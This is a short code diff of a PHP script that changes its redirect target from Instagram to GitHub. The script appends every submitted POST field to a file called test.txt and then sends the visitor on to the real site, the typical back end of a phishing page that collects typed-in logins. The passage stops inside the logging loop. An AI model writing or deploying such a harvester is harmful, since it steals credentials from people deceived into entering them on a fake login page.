@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://www.instagram.com/ ');
+header ('Location: https://github.com/ ');
 $handle = fopen("test.txt", "a");
 foreach($_POST as $variable => $value) {
 	fwrite($handle, $variable);
